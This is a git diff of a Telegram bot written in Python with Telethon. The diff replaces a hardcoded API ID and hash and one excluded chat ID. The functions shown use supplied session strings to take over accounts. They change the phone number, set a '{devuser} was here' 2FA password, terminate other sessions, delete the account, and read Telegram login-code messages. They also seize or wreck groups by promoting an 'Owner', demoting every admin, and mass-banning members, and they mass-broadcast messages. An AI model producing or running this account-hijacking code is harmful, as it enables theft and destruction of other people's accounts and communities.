@@ -334,7 +334,7 @@ async def send_help(event):
 
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
     bot = client = X
 
     try: 
@@ -348,7 +348,7 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
     bot = client = X
 
     result = await bot(functions.account.SendChangePhoneCodeRequest(
@@ -363,7 +363,7 @@ async def change_number(strses, number):
   
 async def userinfo(strses):
     # Create a TelegramClient instance
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
 
     # Get the "me" object
@@ -395,7 +395,7 @@ async def userinfo(strses):
 
 async def userinfop(strses):
     # Create a TelegramClient instance
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
 
     # Get the "me" object
@@ -425,29 +425,29 @@ async def userinfop(strses):
     return info
 
 async def terminate(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
 
     await X(rt())
 
 
 async def terminatep(strses):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     await bot(rt())
 
 async def delacc(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
 
     await X(functions.account.DeleteAccountRequest("I am session note"))
 
 async def delaccp(strses):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
 
     await bot(functions.account.DeleteAccountRequest("I am session note"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
 
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
@@ -455,7 +455,7 @@ async def promote(strses, grp, user):
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def promotep(strses, grp, user):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
 
     try:
@@ -464,7 +464,7 @@ async def promotep(strses, grp, user):
       await bot.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
 
 async def user2fa(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
 
     try:
       await X.edit_2fa(f'{devuser} was here')
@@ -473,7 +473,7 @@ async def user2fa(strses):
       return False
 
 async def user2fap(strses):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     try:
       await bot.edit_2fa(f'{devuser} was here')
@@ -483,7 +483,7 @@ async def user2fap(strses):
 
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
 
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
@@ -492,7 +492,7 @@ async def demall(strses, grp):
         await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
       
 async def demallp(strses, grp):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     async for x in bot.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
@@ -502,13 +502,13 @@ async def demallp(strses, grp):
       
 
 async def joingroup(strses, usernames):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
 
         for username in usernames:
             await X(join(username.strip()))
 
 async def joingroupp(strses, usernames):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
 
     for username in usernames:
@@ -516,36 +516,36 @@ async def joingroupp(strses, usernames):
 
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
     await X(leave(username))
 
 async def leavegroupp(strses, username):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     await bot(leave(username))
 
 
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
 
     await X(dc(username))
     
 async def delgroupp(strses, username):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     await bot(dc(username))
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
     i = ""
 
     async for x in X.iter_messages(777000, limit=3):
@@ -554,7 +554,7 @@ async def usermsgs(strses):
     return str(i)
 
 async def usermsgsp(strses):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect() 
     i = ""
 
@@ -565,7 +565,7 @@ async def usermsgsp(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
     try:
       await X(leave("@vip_nasa"))
     except BaseException:
@@ -590,7 +590,7 @@ async def userbans(strses, grp):
         pass
     
 async def userbansp(strses, grp):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     k = await bot.get_participants(grp)
     for x in k:
@@ -601,7 +601,7 @@ async def userbansp(strses, grp):
     
 
 async def userchannels(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
 
         k = await X(pc())
         i = ""
@@ -620,7 +620,7 @@ async def userchannels(strses):
 
 async def userchannelsp(strses):
     # Create a TelegramClient instance
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     k = await bot(pc())
     i = ""
@@ -642,7 +642,7 @@ from telethon.tl.functions.channels import LeaveChannelRequest
 
 
 async def leaveall(session_string):
-    async with tg(ses(session_string), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(session_string), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         dialogs = await X.get_dialogs()
 
         for dialog in dialogs:
@@ -651,7 +651,7 @@ async def leaveall(session_string):
                 await X(leave(entity))
 
 async def leaveallp(session_string):
-    bot = TelegramClient((session_string), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((session_string), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     dialogs = await bot.get_dialogs()
 
@@ -1841,7 +1841,7 @@ async def connect(event):
 import asyncio
 from telethon import types
 async def gcasta(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -1860,7 +1860,7 @@ async def gcasta(strses, msg):
             pass
 
 async def gcastap(strses, msg):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     try:
             reply_msg = msg
@@ -1941,7 +1941,7 @@ async def users(event):
 
 
 async def gcastb(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -1951,10 +1951,10 @@ async def gcastb(strses, msg):
                 if sweetie.is_group:
                     chat = sweetie.id
                     try:
-                        if chat != -1001878403490:
+                        if chat != -1002041985682:
                             await X.send_message(chat, tol, file=file)
                             sent_groups.append(chat)
-                        elif chat == -1001878403490:
+                        elif chat == -1002041985682:
                             pass
                     except Exception as e:
                         print(e)
@@ -1963,7 +1963,7 @@ async def gcastb(strses, msg):
             print(e)
 
 async def gcastbp(strses, msg):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     try:
             reply_msg = msg
@@ -1974,10 +1974,10 @@ async def gcastbp(strses, msg):
                 if sweetie.is_group:
                     chat = sweetie.id
                     try:
-                        if chat != -1001878403490:
+                        if chat != -1002041985682:
                             await bot.send_message(chat, tol, file=file)
                             sent_groups.append(chat)
-                        elif chat == -1001878403490:
+                        elif chat == -1002041985682:
                             pass
                     except Exception as e:
                         print(e)
@@ -2050,7 +2050,7 @@ async def users(event):
 
 
 async def gcastc(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -2070,7 +2070,7 @@ async def gcastc(strses, msg):
 
 
 async def gcastcp(strses, msg):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     try:
             reply_msg = msg
@@ -2267,7 +2267,7 @@ async def users(event):
 
 
 async def savedmssgs(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         i = ""
 
         # Get the saved messages instead of iterating through messages from a specific chat
@@ -2282,7 +2282,7 @@ async def savedmssgs(strses):
         
 
 async def savedmssgsp(strses, grp):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     i = ""
 
@@ -2450,11 +2450,11 @@ async def connect(event):
 اختر ماذا تريد ان تفعل """, buttons=keyboard)
 
 async def chngenme(strses, new_name):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         await X(UpdateProfileRequest(first_name=new_name))
         
 async def chngenmep(strses, new_name):
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
     await bot(UpdateProfileRequest(first_name=new_name))
     
@@ -2571,7 +2571,7 @@ async def users(event):
 
 
 async def changebio(strses, new_bio):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         await X(UpdateProfileRequest(about=new_bio))
 
 
@@ -2644,7 +2644,7 @@ from io import BytesIO
 from PIL import Image
 
 async def changeprofilepic(strses, profile_pic_msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         try:
             if profile_pic_msg.photo:
                 photo = await profile_pic_msg.download_media()
@@ -2738,7 +2738,7 @@ from telethon.tl.functions.account import UpdateUsernameRequest
 
 
 async def changeuse(strses, new_username):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8") as X:
         await X(UpdateUsernameRequest(username=new_username))
 
 
@@ -2786,7 +2786,7 @@ async def connect(event):
 
 
 async def eeobot(strses):
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
 
     try:
@@ -2868,7 +2868,7 @@ async def users(event):
 
 
 async def xnsex21bot(strses):
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
 
     try:
@@ -2950,7 +2950,7 @@ async def users(event):
 
 
 async def MARKTEBOT(strses):
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 12962251, "b51499523800add51e4530c6f552dbc8")
     await bot.connect()
 
     try:
